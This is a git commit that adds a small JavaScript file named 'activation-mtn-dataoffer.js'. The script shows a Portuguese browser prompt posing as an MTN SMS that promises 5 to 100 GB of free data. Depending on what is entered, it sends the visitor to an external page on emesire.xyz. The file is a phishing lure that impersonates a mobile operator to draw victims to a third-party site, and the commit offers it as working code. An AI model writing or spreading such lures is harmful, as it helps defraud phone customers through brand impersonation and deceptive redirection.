9a92d9f260eef625bf08cc945dcd1e9d1dd56945
sureoffer <emesire247@gmail.com>
2025-06-07 23:21:48 -0700

    Create activation-mtn-dataoffer.js

---
+++ activation-mtn-dataoffer.js
@@ -0,0 +1,5 @@
+var password = 'DADOS GRATUITOS'
+password=prompt('MTN SMS: Estimado cliente, por favor verifique se o seu cartão SIM MTN está qualificado para receber 5 GB a 100 GB de dados. Recompensa para clientes antigos. Clique em Dados grátis para verificar agora. ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://emesire.xyz/mtn-dataoffer.html';
+}
